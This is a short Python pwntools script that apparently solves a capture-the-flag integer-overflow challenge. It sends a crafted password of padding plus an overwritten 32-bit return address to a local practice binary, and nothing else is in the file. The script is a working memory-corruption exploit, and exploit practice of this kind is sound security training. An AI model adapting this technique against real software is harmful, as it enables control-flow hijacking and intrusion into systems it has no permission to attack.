from pwn import *
p=process("./pwn/integer/int-1/int1")
overflowMax=260
payload=0x18*b'a'+p32(0x0804868b)
payload+=(overflowMax-len(payload))*b'a'
p.sendlineafter("Your choice:",'1')
p.sendlineafter("Please input your username:",'test')
p.sendlineafter("Please input your passwd:",payload)
print(p.recvall())